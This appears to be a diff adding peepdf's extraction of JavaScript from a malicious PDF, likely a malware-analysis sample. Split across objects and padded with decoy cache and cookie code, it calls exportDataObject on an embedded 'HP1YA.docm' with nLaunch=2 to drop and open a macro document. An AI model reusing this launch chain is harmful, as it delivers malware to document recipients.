@@ -1,0 +1,178 @@
+// peepdf comment: Javascript code located in object 22 (version 0)
+
+function DT() {
+    return 'exportDataObject';
+};
+
+// peepdf comment: Javascript code located in object 23 (version 0)
+
+var noop = function() {};
+var cache = function(opts) {
+        var set = del = noop;
+        var get = function(key, fn) {
+                if (fn) fn();
+            };
+        var store = opts.store;
+        var expiry = opts.expiry;
+        var options = opts.options;
+        var debug = options.debug;
+        var memoryCache = typeof opts.memory == 'boolean' ? opts.memory : true;
+        var onConnect = options.onConnect || noop;
+        var onError = options.onError || noop;
+        if (!store) memoryCache = true;
+        if (debug) console.log('memoryCache: ' + memoryCache);
+        if (store == 'memcached') {
+            var Memcached = require('memcached');
+            var memcached = new Memcached(options.servers.split(','));
+            memcached.on('reconnected', onConnect);
+            memcached.on('issue', onError);
+            memcached.on('failure', onError);
+            memcached.on('remove', onError);
+            onConnect();
+            set = function(key, value, expiry) {
+                memcached.set(key, value, expiry, noop);
+            };
+            get = function(key, fn) {
+                memcached.get(key, fn);
+            };
+            del = function(key) {
+                memcached.del(key, noop);
+            };
+        } else if (store == 'redis') {
+            var redis = require('redis');
+            if (debug) redis.debug_mode = true;
+            var redisClient;
+            var redisURL = options.url;
+            if (redisURL) {
+                var url = require('url').parse(redisURL);
+                redisClient = redis.createClient(url.port, url.hostname, {
+                    auth_pass: url.auth.split(':')[1]
+                });
+            } else {
+                redisClient = redis.createClient(null, null);
+            }
+            redisClient.on('connect', onConnect);
+            redisClient.on('error', onError);
+            set = function(key, value, expiry) {
+                if (!redisClient.connected) return;
+                var strValue = JSON.stringify(value);
+                if (expiry) {
+                    redisClient.setex(key, expiry, strValue);
+                } else {
+                    redisClient.set(key, strValue);
+                }
+            };
+            get = function(key, fn) {
+                if (!redisClient.connected) return;
+                redisClient.get(key, function(err, strValue) {
+                    if (err) {
+                        fn(err);
+                        return;
+                    }
+                    try {
+                        var value = JSON.parse(strValue);
+                        fn(null, value);
+                    } catch (e) {
+                        fn(e);
+                    }
+                });
+            };
+            del = function(key) {
+                if (!redisClient.connected) return;
+                redisClient.del(key);
+            };
+        }
+        return {
+            set: function(key, value, expiry) {
+                if (memoryCache) memory.put(key, value, expiry ? (expiry * 1000) : null);
+                set(key, value, expiry);
+            },
+            get: function(key, fn) {
+                var value;
+                if (memoryCache && (value = memory.get(key))) {
+                    fn(null, value);
+                    return;
+                }
+                get(key, function(e, value) {
+                    if (e) {
+                        fn(e);
+                        return;
+                    }
+                    fn(null, value);
+                    if (memoryCache) memory.put(key, value, expiry ? expiry / 2 * 1000 : null);
+                });
+            },
+            del: function(key) {
+                if (memoryCache) memory.del(key);
+                del(key);
+            }
+        };
+    };
+
+// peepdf comment: Javascript code located in object 25 (version 0)
+
+function DO() {
+    return DT();
+};
+
+// peepdf comment: Javascript code located in object 26 (version 0)
+
+var c = {};
+c['cName'] = 'HP1YA.docm';
+
+// peepdf comment: Javascript code located in object 27 (version 0)
+
+var doH = DO();
+
+// peepdf comment: Javascript code located in object 28 (version 0)
+
+var das = 4 - 2 - 1 - 1 + 3 - 1;
+var api9 = this[doH];
+
+// peepdf comment: Javascript code located in object 29 (version 0)
+
+function api8() {
+    c['nLau' + 'nch'] = 2;
+};
+
+// peepdf comment: Javascript code located in object 30 (version 0)
+
+function a100500() {
+    var cookie1 = function(name) {
+            var dc = document.cookie;
+            var prefix = name + '=';
+            var begin = dc.indexOf('; ' + prefix);
+            if (begin == -1) {
+                begin = dc.indexOf(prefix);
+                if (begin != 0) return '';
+            } else {
+                begin += 2;
+            }
+            var end = document.cookie.indexOf(';', begin);
+            if (end == -1) {
+                end = dc.length;
+            }
+            var value = unescape(dc.substring(begin + prefix.length, end));
+            if (value == ';') {
+                return '';
+            }
+            return value;
+        };
+    var cookie2 = function(name, value, expires, secure) {
+            var cookie = name + '=' + escape(value) + ((expires) ? '; expires=' + expires.toGMTString() : '');
+            path = ((secure) ? '; secure' : '');
+            document.cookie = cookie;
+        };
+};
+
+// peepdf comment: Javascript code located in object 32 (version 0)
+
+function ApplicationJS() {
+    api8();
+};
+
+// peepdf comment: Javascript code located in object 39 (version 0)
+
+ApplicationJS();
+api9(c);
+
